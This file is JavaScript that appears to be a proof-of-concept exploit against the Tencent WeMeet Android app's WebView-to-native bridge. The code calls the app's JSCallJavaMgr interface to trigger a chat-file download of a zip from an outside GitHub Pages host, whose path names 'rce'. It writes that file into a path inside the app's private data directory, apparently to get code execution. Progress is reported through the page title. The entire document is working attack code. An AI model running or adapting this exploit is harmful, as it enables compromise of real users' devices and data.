(function(){
  document.title='P100TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P100CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,80);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__p',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P100TB-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P100TB-NOMGR:'+location.host;return}
  var path='/data/data/com.tencent.wemeet.app/files/Global/Data/WebViewShare/5b0dd3209b376a05fc0678d96fb4c27c/6aede786b613dd5a2c7f0f810c71b2ea';
  var zip='https://gitwhs.github.io/wm-poc-rce/p97avatar.zip';
  var info={
    path:path,
    title:'p100.zip',
    url:zip,
    download_url:zip,
    file_url:zip,
    resource_url:zip,
    file_path:path,
    local_path:path,
    md5:'875abefe668c3f5f86325b9fa4dc789e',
    size:666,
    from_webView:true
  };
  var extra={
    file_info:info,
    path:path,
    title:'p100.zip',
    url:zip,
    download_url:zip
  };
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['DL','CommonPlugin','OpenNewPage',{
      scheme:'wemeet://page/chatrecord/chat_file_download',
      router_params:{
        im_file_extra:extra,
        file_info:info,
        path:path,
        title:'p100.zip',
        url:zip,
        download_url:zip,
        from_webView:true
      }
    }]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P100TB-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P100-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 4000);
  }
  setTimeout(n, 800);
})();
